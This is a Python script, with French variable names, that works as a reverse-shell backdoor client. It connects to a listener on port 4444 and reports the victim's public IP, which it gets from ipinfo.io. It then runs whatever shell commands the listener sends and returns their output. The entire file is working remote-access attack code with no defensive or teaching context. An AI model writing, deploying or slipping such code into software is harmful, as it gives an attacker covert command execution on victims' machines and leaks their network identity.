# coding: utf-8
import socket
import os
import subprocess
import requests

hote = 'localhost'
port = 4444
shlp = ""
connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connexion_avec_serveur.connect((hote, port))
r = requests.get('https://ipinfo.io/json')
data = r.json()
ip = data['ip']
connexion_avec_serveur.send(ip.encode('utf-8'))
while 1:
	msg = connexion_avec_serveur.recv(1024)
	
	if msg.startswith(b'shell') == True:
		path1 =  os.getcwd().encode('utf-8')
		connexion_avec_serveur.send(b"\n"+path1+ b'$ ')
		while shlp != 'leave':
			
			shlp = connexion_avec_serveur.recv(1024)
			shlp = shlp.decode('utf-8')
			if len(shlp) > 0:
				if shlp[0:2] == 'cd':
					path =  os.getcwd().encode('utf-8')
					connexion_avec_serveur.send(b"\n"+path+ b'$ ')
				elif shlp == 'len0':
					path =  os.getcwd().encode('utf-8')
					connexion_avec_serveur.send(b"\n"+path+ b'$ ')

				else:
					cmd = subprocess.Popen(str(shlp), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					output_bytes = cmd.stdout.read()
					path =  os.getcwd().encode('utf-8')
					connexion_avec_serveur.send(output_bytes+b"\n"+path1+ b'$ ')

			else:
				path =  os.getcwd().encode('utf-8')
				connexion_avec_serveur.send(b"\n"+path+ b'$ ')
